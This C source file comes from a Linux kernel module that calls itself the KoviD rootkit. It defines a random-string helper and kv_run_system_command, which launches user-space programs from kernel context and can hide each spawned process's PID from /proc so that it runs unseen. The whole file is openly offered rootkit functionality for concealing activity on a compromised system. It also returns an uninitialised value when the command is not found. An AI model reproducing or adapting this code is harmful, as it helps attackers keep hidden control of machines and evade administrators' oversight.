//  KoviD rootkit
// - hash
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/random.h>
#include "lkm.h"
#include "fs.h"
#include "log.h"

// This function allocates dynamic memory
// and must be freed when no longer needed
char *kv_util_random_AZ_string(size_t size)
{
	static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
				      "abcdefghijklmnopqrstuvwxyz"
				      "0123456789";
	int i;
	u8 byte;
	char *buf;

	if (size < 2) {
		prerr("Invalid argument\n");
		return NULL;
	}

	buf = kmalloc(size, GFP_KERNEL);
	if (!buf) {
		prerr("Memory error\n");
		return NULL;
	}

	for (i = 0; i < size - 1; ++i) {
		get_random_bytes(&byte, 1);
		buf[i] = charset[byte % (sizeof(charset) - 1)];
	}
	buf[i] = '\0';

	return buf;
}

// child_initfn: Hides the PID from /proc if 'hide' was requested.

/* We'll store a 'hide' boolean in 'info->data' if we want to hide. */
struct hide_data {
	bool hide;
};

// Called in the child context before execve.
static int child_initfn(struct subprocess_info *info, struct cred *new)
{
	struct hide_data *d = info->data;
	if (d && d->hide) {
		prinfo("KoviD: child_initfn -> hiding PID=%d\n", current->pid);
		kv_hide_task_by_pid(current->pid, 0, true);
	}
	return 0;
}

// Called after the child exits or if exec fails.
static void child_cleanupfn(struct subprocess_info *info)
{
	prinfo("KoviD: child_cleanupfn -> process done.\n");
	// free the hide_data if allocated
	if (info->data) {
		kfree(info->data);
		info->data = NULL;
	}
}

// kv_run_system_command:
//   cmd[]: argument vector (e.g. {"/usr/bin/ebpf-kovid", NULL});
//   hide:  if true => hide PID in child_initfn
//   detach: if true => run asynchronously (UMH_NO_WAIT), else sync (UMH_WAIT_EXEC).
//
// Return: negative on error, or 0/positive on success (call_usermodehelper_exec).
int kv_run_system_command(char *cmd[], bool hide, bool detach)
{
	struct path path;
	struct kstat stat;
	struct subprocess_info *info;
	int rv;
	struct hide_data *d = NULL;

	if (!cmd)
		return -EINVAL;

	// Check that the command exists
	if (fs_kern_path(cmd[0], &path) && fs_file_stat(&path, &stat)) {
		path_put(&path);

		// If we might hide the process, allocate a small structure
		//    to store that 'hide' boolean. This will be info->data.
		if (hide) {
			d = kmalloc(sizeof(*d), GFP_KERNEL);
			if (!d)
				return -ENOMEM;
			d->hide = true;
		}

		// Setup the user-mode helper
		//    - pass child_initfn only if hide or if we want to do something anyway.
		//      (We can pass child_initfn always, it won't hide if d==NULL).
		info = call_usermodehelper_setup(cmd[0], cmd, NULL, GFP_KERNEL,
						 child_initfn, /* init  */
						 child_cleanupfn, /* cleanup */
						 d /* info->data */);
		if (!info) {
			kfree(d);
			return -EINVAL;
		}

		// Actually exec it. UMH_NO_WAIT => async, UMH_WAIT_EXEC => sync.
		rv = call_usermodehelper_exec(info, (detach ? UMH_NO_WAIT :
							      UMH_WAIT_EXEC));
		if (rv < 0) {
			prerr("KoviD: call_usermodehelper_exec failed, rv=%d\n",
			      rv);
			// On failure, the kernel frees 'info' and info->data automatically.
		} else {
			prinfo("KoviD: call_usermodehelper_exec -> spawned child, rv=%d\n",
			       rv);
		}
	}
	return rv;
}
